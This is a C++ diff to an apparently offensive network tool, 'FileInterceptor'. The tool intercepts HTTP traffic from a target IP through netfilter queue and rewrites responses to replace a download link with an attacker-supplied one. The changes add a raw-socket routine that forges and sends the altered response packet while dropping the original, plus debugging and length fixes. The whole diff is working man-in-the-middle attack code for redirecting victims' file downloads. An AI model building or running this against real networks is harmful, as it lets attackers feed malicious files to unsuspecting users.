@@ -104,12 +104,9 @@ bool32 FilterResponse(tcphdr* tcpHeader, char* payload, uint32_t requestAckNum)
     uint32_t res = PacketCraft::GetTCPDataProtocol((TCPHeader*)tcpHeader); // TODO: is this a safe cast?
     if(res == PC_HTTP_RESPONSE)
     {
-        if(PacketCraft::GetHTTPMethod((uint8_t*)payload) == PC_HTTP_SUCCESS)
-        {
-            // response matching the original request found
-            if(tcpHeader->seq == requestAckNum)
-                return TRUE;
-        }
+        // response matching the original request found
+        if(tcpHeader->seq == requestAckNum)
+            return TRUE;
     }
 
     return FALSE;
@@ -123,8 +120,68 @@ int CreateResponsePayload(char* buffer, size_t bufferLen, const char* newDownloa
     return NO_ERROR;
 }
 
+int SendNewResponseIPv4(const char* interfaceName, iphdr* ipHeader, tcphdr* tcpHeader, char* payload, uint32_t payloadLen)
+{
+    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
+    if(socketFd == -1)
+    {
+        LOG_ERROR(APPLICATION_ERROR, "socket() error");
+        return APPLICATION_ERROR;
+    }
+
+    ether_addr targetMAC{};
+    memset(targetMAC.ether_addr_octet, 0xff, ETH_ALEN);
+
+    ether_addr sourceMAC{};
+    if(PacketCraft::GetMACAddr(sourceMAC, interfaceName, socketFd) == APPLICATION_ERROR)
+    {
+        close(socketFd);
+        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::GetMACAddr() error");
+        return APPLICATION_ERROR;
+    }
+
+    PacketCraft::Packet packet;
+
+    packet.AddLayer(PC_ETHER_II, ETH_HLEN);
+    EthHeader* ethHeader = (EthHeader*)packet.GetLayerStart(0);
+    memcpy(ethHeader->ether_shost, sourceMAC.ether_addr_octet, ETH_ALEN);
+    memcpy(ethHeader->ether_dhost, targetMAC.ether_addr_octet, ETH_ALEN);
+    ethHeader->ether_type = htons(ETH_P_IP);
+
+    packet.AddLayer(PC_IPV4, 4 * ipHeader->ihl);
+    IPv4Header* ipv4Header = (IPv4Header*)packet.GetLayerStart(1);
+    memcpy(ipv4Header, ipHeader, 4 * ipHeader->ihl);
+
+    packet.AddLayer(PC_TCP, 4 * tcpHeader->th_off);
+    TCPHeader* tcpHdr = (TCPHeader*)packet.GetLayerStart(2);
+    memcpy(tcpHdr, tcpHeader, 4 * tcpHeader->th_off);
+
+    packet.AddLayer(PC_HTTP_RESPONSE, payloadLen);
+    uint8_t* newPayload = (uint8_t*)packet.GetLayerStart(3);
+    memcpy(newPayload, payload, payloadLen);
+
+    ipv4Header->ip_len = htons(packet.GetSizeInBytes() - sizeof(ETH_HLEN));
+
+    packet.CalculateChecksums();
+
+    std::cout << "new PacketCraft::Packet:\n";
+    packet.Print();
+
+    if(packet.Send(socketFd, interfaceName, 0) == APPLICATION_ERROR)
+    {
+        close(socketFd);
+        LOG_ERROR(APPLICATION_ERROR, "PacketCraft::Packet::Send() error");
+        return APPLICATION_ERROR;
+    }
+
+    close(socketFd);
+
+    return NO_ERROR;
+}
+
 bool32 requestFiltered{FALSE};
 uint32_t requestAckNum{0};
+bool32 responseCreated{FALSE};
 
 static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg, struct nfq_data *nfad, void *data)
 {
@@ -136,6 +193,20 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
         LOG_ERROR(APPLICATION_ERROR, "nfq_get_msg_packet_hdr() error");
         return -1;
     }
+
+    /*
+        NOTE: for some reason when we mangle the packet and try to sent it, according to wireshark the original UNedited packet gets sent twice. 
+        In order to work around that problem, we craft a completely new packet, drop the original one, and then send the new packet. The new packet that
+        we sent will arrive on this queue and we need to let it through.
+
+        TODO: Instead of doing this, try to use the "New API based on libmnl" in libnetfilter_queue.h, maybe that works...
+    */
+    if(responseCreated == TRUE)
+    {
+        // TODO: verify that this is actually the packet we want to let through
+        responseCreated = FALSE;
+        return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);     
+    }    
 
     unsigned char* rawData = nullptr;
     int len = nfq_get_payload(nfad, &rawData);
@@ -259,7 +330,10 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
 
         // payload len includes the header and options size, so we need to subtract those
         unsigned int payloadLen = nfq_tcp_get_payload_len(tcpHeader, pkBuff);
-        payloadLen -= 4 * tcpHeader->th_off;
+        if(payloadLen > 4 * tcpHeader->th_off)
+            payloadLen -= 4 * tcpHeader->th_off;
+        else
+            payloadLen = 0;
 
         std::cout << "payload len was " << payloadLen << std::endl;
         
@@ -287,7 +361,7 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
                 // dropped as expected. However if we try to drop the packet after mangling, it will not be dropped.
                 // Something goes wrong with the mangling process. Also we may need to do something about the 
                 // ack/seq numbers when we edit the payload. Also there is a bug because some wierd stuff gets printed in the console. Possibly
-                // something left over in a buffer.
+                // something left over in a buffer. Try dropping the packet and sending a copy through a raw socket
                 // return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_DROP, pktb_len(pkBuff), pktb_data(pkBuff));
 
                 std::cout << "response filtered\n";
@@ -305,13 +379,14 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
                 {
                     std::cout << "before mangling\n";
                     char ipStrBuf[PC_IPV4_MAX_STR_SIZE]{};
-                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
+                    nfq_ip_snprintf(ipStrBuf, PC_IPV4_MAX_STR_SIZE, ipv4Header);
                     std::cout << ipStrBuf << std::endl;
-                    memset(ipStrBuf, 0, PC_IPV4_MAX_STR_SIZE);
 
                     char tcpStrBuf[PC_TCP_MAX_STR_SIZE]{};
-                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
+                    nfq_tcp_snprintf(tcpStrBuf, PC_TCP_MAX_STR_SIZE, tcpHeader);
                     std::cout << tcpStrBuf << std::endl;
+
+                    memset(ipStrBuf, 0, PC_IPV4_MAX_STR_SIZE);
                     memset(tcpStrBuf, 0, PC_TCP_MAX_STR_SIZE);
 
                     if(nfq_tcp_mangle_ipv4(pkBuff, 4 * tcpHeader->th_off, payloadLen, httpResponse, newResponseLen) < 0)
@@ -323,11 +398,13 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
                         return -1;
                     }
 
-                    std::cout << "after mangling\n";
-                    PacketCraft::ConvertIPv4LayerToString(ipStrBuf, PC_IPV4_MAX_STR_SIZE, (IPv4Header*)ipv4Header);
-                    std::cout << ipStrBuf << std::endl;
+                    std::cout << "client ack: " << htonl(requestAckNum) << std::endl;
 
-                    PacketCraft::ConvertTCPLayerToString(tcpStrBuf, PC_TCP_MAX_STR_SIZE, (TCPHeader*)tcpHeader);
+                    std::cout << "after mangling\n";
+                    nfq_ip_snprintf(ipStrBuf, PC_IPV4_MAX_STR_SIZE, ipv4Header);
+                    std::cout << ipStrBuf << std::endl;
+                    
+                    nfq_tcp_snprintf(tcpStrBuf, PC_TCP_MAX_STR_SIZE, tcpHeader);
                     std::cout << tcpStrBuf << std::endl;
                 }
                 else if(ethProto == ETH_P_IPV6)
@@ -340,11 +417,24 @@ static int netfilterCallback(struct nfq_q_handle *queue, struct nfgenmsg *nfmsg,
                         LOG_ERROR(APPLICATION_ERROR, "nfq_ip6_mangle() error");
                         return -1;
                     }
-                }   
+                } 
 
                 requestFiltered = FALSE;
                 requestAckNum = 0;
-                return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
+
+                if(SendNewResponseIPv4(callbackData.interfaceName, ipv4Header, tcpHeader, httpResponse, newResponseLen) == APPLICATION_ERROR)
+                {
+                    LOG_ERROR(APPLICATION_ERROR, "SendNewResponseIPv4() error");
+                    responseCreated = FALSE;
+                    return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, 0, nullptr);
+                }
+                else
+                {
+                    responseCreated = TRUE;
+                    return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_DROP, pktb_len(pkBuff), pktb_data(pkBuff));
+                }
+
+                // return nfq_set_verdict(queue, ntohl(ph->packet_id), NF_ACCEPT, pktb_len(pkBuff), pktb_data(pkBuff));
             }
         }
     }
@@ -359,6 +449,7 @@ int main(int argc, char** argv)
     char targetIPStr[INET6_ADDRSTRLEN]{};
     char downloadLink[DOWNLOAD_LINK_STR_SIZE]{};
     char newDownloadLink[DOWNLOAD_LINK_STR_SIZE]{};
+    uint32_t queueNum{0};
 
     if(ProcessArgs(argc, argv, interfaceName, ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
     {
@@ -367,39 +458,14 @@ int main(int argc, char** argv)
         return APPLICATION_ERROR;
     }
 
-    /*
-
-    int socketFd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
-
     CHaks::FileInterceptor fileInterceptor;
-
-    if(fileInterceptor.Init(ipVersion) == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
-        close(socketFd);
-        return APPLICATION_ERROR;
-    }
-
-    if(fileInterceptor.Run(socketFd, interfaceName, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
-    {
-        LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
-        close(socketFd);
-        return APPLICATION_ERROR;
-    }
-
-
-    close(socketFd);
-
-    */
-
-    CHaks::FileInterceptor fileInterceptor;
-    if(fileInterceptor.Init(ipVersion, targetIPStr, downloadLink, newDownloadLink) == APPLICATION_ERROR)
+    if(fileInterceptor.Init(ipVersion, interfaceName, targetIPStr, downloadLink, newDownloadLink, queueNum) == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Init() error");
         return APPLICATION_ERROR;
     }
 
-    if(fileInterceptor.Run2(netfilterCallback) == APPLICATION_ERROR)
+    if(fileInterceptor.RunTest() == APPLICATION_ERROR)
     {
         LOG_ERROR(APPLICATION_ERROR, "CHaks::FileInterceptor::Run() error");
         return APPLICATION_ERROR;
